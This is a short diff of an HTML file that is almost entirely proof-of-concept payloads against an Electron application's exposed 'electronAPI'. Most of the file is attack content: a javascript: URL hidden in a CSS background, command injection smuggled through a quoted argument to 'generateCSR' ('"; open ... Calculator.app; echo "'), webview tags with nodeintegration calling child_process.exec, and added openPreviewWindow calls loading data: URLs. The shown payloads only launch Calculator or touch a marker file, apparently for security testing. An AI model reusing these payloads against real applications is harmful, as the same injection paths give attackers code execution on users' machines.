@@ -8,7 +8,7 @@
 
 <div style="background:url('javascript:(async()=>{const c=\"\\\"; touch /tmp/XSS-RCE-PROOF; open -a Calculator; echo \\\"\";await window.electronAPI.generateCSR(\"x\",c)})()')">Prove RCE</div>
 
-
+<script>window.electronAPI.openPreviewWindow('data:text/html,<script>/* browser exploit */</script>');</script>
 <script>alert(1)</script>
 <script>alert(2)</script>
 <scrtip>
@@ -24,6 +24,7 @@ await window.electronAPI.generateCSR('pwned', '"; open /System/Applications/Calc
 await window.electronAPI.generateCSR('pwned', '"; open /System/Applications/Calculator.app; echo "');
 
 </scrtip>
+<script>window.electronAPI.openPreviewWindow('data:text/html,<script>/* browser exploit */</script>');</script>
 <webview src="data:text/html,<script>require('child_process').exec('open /System/Applications/Calculator.app')</script>" nodeintegration></webview><!-- Injected into web content -->
 <webview src="data:text/html,<script>require('child_process').exec('open /System/Applications/Calculator.app')</script>" nodeintegration></webview><!-- Injected into web content -->
 <webview src="data:text/html,<script>require('child_process').exec('open /System/Applications/Calculator.app')</script>" nodeintegration></webview><!-- Injected into web content -->
